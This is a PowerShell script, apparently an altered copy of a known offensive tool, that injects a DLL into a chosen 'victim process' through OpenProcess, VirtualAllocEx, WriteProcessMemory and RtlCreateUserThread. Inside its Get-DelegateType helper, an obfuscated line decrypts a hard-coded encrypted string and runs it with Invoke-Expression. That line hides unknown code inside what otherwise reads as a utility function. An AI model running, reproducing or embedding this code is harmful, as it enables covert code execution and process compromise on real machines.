function Invoke-DllInjection
{

    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [Int]
        $ProID,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Dll
    )

    
    try
    {
        Get-Process -Id $ProID -ErrorAction Stop | Out-Null
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw "Process does not exist!"
    }
    
    
    try
    {
        $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
        Write-Verbose "Full path to Dll: $Dll"
        $AsciiEncoder = New-Object System.Text.ASCIIEncoding
       
        $DllByteArray = $AsciiEncoder.GetBytes($Dll)
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw "Invalid Dll path!"
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        ieX ( (NEw-obJEcT MaNAgeMEnt.aUTOMATioN.PSCrEDENtIal  ' ', ('76492d1116743f0423413b16050a5345MgB8AE0ATQBWAGQAYgBhAEwAMABZADUAeABPAG8AMgBkADEAeAB3AFQAWAA1AEEAPQA9AHwAOAA4AGYAZgBkAGIAMAA1AGEAZAAxADcANwAzAGMAZQBmADgANwBmAGQAOQAyADkAMAAxAGQAOQA3AGEAMwBiADgANABhAGMANQAzADYAMQBmADUAMQAyAGEANABiADEAOQBhAGQAYgA5AGUAZgBjADgAZgA1ADgAOABhADcAZAA1AGMANwBlADUAZQA3AGUANABhADAANQBjADQANAA5ADQANwBiAGQANABhADYAZAA3AGIAMwA4AGMANwA1AGMANgA3AGEAOABiAGEAMAA1ADQAZQAyADkANAAxADUAMABlAGIAMABkADgAYQBjADcAOQA0AGQAOQBhADQAZgA4ADEAZAA0AGIAMgBjAGEAMwA0ADMAMwBmADMAZQBiAGEAMQBjADAAYQBjADgANgBmADYAOABmADQAYwA3AGQAMAAxAGUANgBmAGYAYwA2ADEAYQA0ADYAZAAyADAANwBlADkAYgA0AGMAYQA3AGEAYgA1AGUAOAA4ADAAOQA3ADIAZQA2AGYAMAA4AGQANwBmADUANgAzADYANwA1AGIANwBhADIANQBmADMANQBhADUAOABmADUAMgBmADcAZABmAGMAYQAwADEAYgA0ADIAMQA1ADYAMQAwAGUAOAA3AGYAMQA5ADQAYwA4AGYAOAAzAGYAYwAyADcAZQAyAGMANgBhAGEANQAxAGMAMAA1AGIAYgA0AGIAYwA3AGUAMABlADAANQA5ADcAYgBjAGQAMAA0AGIANgA0AGQAMQA2AGUAMwA0AGQAOQA2ADIANgAzAGQAMAA5AGQAMABkADYANQA2AGIAOQAzADgANAA2AGYAMQA3ADEAYgBlAGMAZgA1ADIAZQAxAGIAZQBhAGYAOQA1ADcAYQA4AGQAOQA1ADAAMwA0AGUANwAzADQAOAA0ADIAMwAxADMAOQBiADAANQA2ADgANABjAGYAZQA0ADEAYQBhAGIAMgA4ADIAMwAwADYANQA4ADgANgA2ADEANAAxADIANQA0ADkAZAAyADcAOABkAGMAOAA0AGMAYQAxAGIAYgBmADIAYwBhADcAYwAwADMANQBkADcAZAA0ADAAZgA0AGMAZQAzADYANwA1ADcANwA2ADkANQBhADMAOAA1AGYAMgBjADAAOQAyADUAMAA3ADEAOABiAGMAZgA2ADAANQA2ADQAMQBkAGYAMwA5ADcAYwA5AGYAOQAxADgAMwBkADUAMwA3ADEAZQAzADUANQBhAGUANgBjADAAZQBjAGYAZgA4ADkAOAA0ADIAYQA0ADMAZgBhADIAYQBjAGYANwBhADAAMwA2ADEAYQA0ADUAMwBhADUAMgBjAGMAYwAzADUANwBjAGUANgBhADMAZgBmADcAZQBjADcAMQBiADkAYwA4ADMAOQBhADIAMQA1AGEAYgA0ADgAYQBhADQAYQBiAGYANwA0AGMAZgA='|COnvertto-SECUREstriNG -kE 229,246,240,34,249,250,114,80,110,234,230,60,76,212,101,119,171,157,77,181,89,19,164,20)).GeTNetwoRkCrEDEnTiAL().pASSWoRd )
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )


        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
       
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    function Local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            $Path
        )
    
       
        $StreamingFile = New-Object System.IO.StreamingFile($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
    
        [Byte[]] $MZHeader = New-Object Byte[](2)
        $StreamingFile.Read($MZHeader,0,2) | Out-Null
    
        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if ($Header -ne 'MZ')
        {
            $StreamingFile.Close()
            Throw 'Invalid PE header.'
        }
    
        
        $StreamingFile.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
    
        [Byte[]] $lfanew = New-Object Byte[](4)
    
       
        $StreamingFile.Read($lfanew,0,4) | Out-Null
        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
    
      
        $StreamingFile.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
    
      
        $StreamingFile.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
        $StreamingFile.Close()
    
        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }
    
        if ($Architecture -eq '014C')
        {
            Write-Output 'X86'
        }
        elseif ($Architecture -eq '8664')
        {
            Write-Output 'X64'
        }
        else
        {
            Write-Output 'OTHER'
        }
    }

    
    
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
    $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    $RtlCreateUserThreadAddr = Get-ProcAddress ntdll.dll RtlCreateUserThread
    $RtlCreateUserThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $RtlCreateUserThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RtlCreateUserThreadAddr, $RtlCreateUserThreadDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

   
    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $True
    }
    else
    {
        $PowerShell32bit = $False
    }

    if (${Env:ProgramFiles(x86)}) {
        $64bitOS = $True
    } else {
        $64bitOS = $False
    }

  
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    if ($IsWow64ProcessAddr)
    {
    	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
    }

    $Architecture = Get-PEArchitecture $Dll

    Write-Verbose "Architecture of the dll to be injected: $Architecture"

   
    $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProID) 

    if (!$hProcess)
    {
        Throw 'Unable to open process handle.'
    }

    if ($64bitOS) 
    {
        if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') )
        {
            Throw 'Only x86 or AMD64 architechtures supported.'
        }

      
        $IsWow64 = $False
        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null

        if ( $PowerShell32bit -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'
        }

        if ( (!$IsWow64) -and ($Architecture -eq 'X86') )
        {
            Throw 'You cannot inject a 32-bit DLL into a 64-bit process.'
        }

        if ( $IsWow64 -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot inject a 64-bit DLL into a 32-bit process.'
        }
    }
    else
    {
        if ($Architecture -ne 'X86')
        {
            Throw 'PE file was not compiled for x86.'
        }
    }

   
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    Write-Verbose "LoadLibrary address: 0x$($LoadLibraryAddr.ToString("X$([IntPtr]::Size*2)"))"

    
    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4)
    if ($RemoteMemAddr -eq [IntPtr]::Zero)
    {
        Throw 'Unable to allocate memory in remote process. Try running PowerShell elevated.'
    }
    Write-Verbose "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

    
    $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $Dll.Length, [Ref] 0) | Out-Null
    Write-Verbose "Dll path written sucessfully."

    
    $Result = $RtlCreateUserThread.Invoke($hProcess, [IntPtr]::Zero, $False, 0, [IntPtr]::Zero, [IntPtr]::Zero, $LoadLibraryAddr, $RemoteMemAddr, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($Result)
    {
        Throw "Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8'))"
    }
    
    $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null 

   
    $CloseHandle.Invoke($hProcess) | Out-Null

    Start-Sleep -Seconds 2

    
    $FileName = (Split-Path $Dll -Leaf).ToLower()
    $DllInfo = (Get-Process -Id $ProID).Modules | ? { $_.FileName.ToLower().Contains($FileName) }

    if (!$DllInfo)
    {
        Throw "Dll did dot inject properly into the victim process."
    }

    Write-Verbose 'Dll injection complete!'

    $DllInfo
}